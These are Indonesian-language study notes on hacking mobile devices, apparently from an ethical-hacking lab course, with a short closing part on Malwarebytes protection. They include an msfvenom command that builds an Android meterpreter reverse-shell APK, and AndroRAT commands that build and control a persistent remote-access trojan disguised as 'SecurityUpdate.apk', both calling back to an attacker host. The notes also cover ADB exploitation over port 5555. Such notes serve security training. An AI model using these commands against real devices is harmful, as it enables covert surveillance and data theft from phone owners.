# Peretasan Platform Seluler
Perangkat seluler memungkinkan komunikasi antara pengguna pada frekuensi radio, baik itu GSM, LTE, 5G, atau Wi-Fi. Mereka dapat digunakan untuk mengirim konten multimedia, email, dan melakukan banyak tugas lainnya menggunakan Internet. Keamanan seluler menjadi semakin menantang dengan munculnya serangan yang kompleks yang menggunakan beberapa vektor serangan untuk mengompromikan perangkat seluler. Ancaman keamanan ini mengeksploitasi data kritis serta informasi keuangan dan detail lainnya dari pengguna seluler dan juga dapat merusak reputasi jaringan seluler dan organisasi.

<br>

- `msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > Desktop/Backdoor.apk`

Eksploitasi Platform Android melalui ADB menggunakan PhoneSploit:
- Android Debug Bridge (ADB) adalah alat baris perintah yang serbaguna yang memungkinkan Anda berkomunikasi dengan perangkat. ADB memfasilitasi berbagai tindakan perangkat seperti menginstal dan mendebag aplikasi, dan memberikan akses ke shell Unix yang dapat Anda gunakan untuk menjalankan beberapa perintah yang berbeda pada perangkat.
- Biasanya, pengembang terhubung ke ADB pada perangkat Android dengan menggunakan kabel USB, tetapi juga memungkinkan untuk melakukannya secara nirkabel dengan mengaktifkan server daemon di port TCP 5555 pada perangkat.

Retas Perangkat Android dengan Membuat File APK menggunakan AndroRAT:
- AndroRAT adalah alat yang dirancang untuk memberikan kontrol sistem Android kepada pengguna jarak jauh dan untuk mengambil informasi dari itu. AndroRAT adalah aplikasi klien/server yang dikembangkan dalam Java Android untuk sisi klien dan Server berada dalam Python. AndroRAT menyediakan backdoor yang sepenuhnya persisten ke perangkat target karena aplikasi tersebut secara otomatis mulai saat boot up perangkat, juga mendapatkan lokasi saat ini, detail kartu SIM, alamat IP, dan alamat MAC perangkat.
- `python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk`
  - --build: digunakan untuk membangun APK
  - -i: menentukan alamat IP lokal (di sini, 10.10.1.13)
  - -p: menentukan nomor port (di sini, 4444)
  - -o: menentukan file APK output (di sini, SecurityUpdate.apk)
- `python3 androRAT.py --shell -i 0.0.0.0 -p 4444 `

https://www.sisik.eu/apk-tool

Amankan Perangkat Android dari Aplikasi Berbahaya menggunakan Malwarebytes Security:

- Malwarebytes adalah alat keamanan seluler antimalware yang memberikan perlindungan terhadap malware, ransomware, dan ancaman lainnya yang berkembang pada perangkat Android. Ini memblokir, mendeteksi, dan menghapus adware dan malware; melakukan audit privasi untuk semua aplikasi; dan memastikan penjelajahan yang lebih aman.
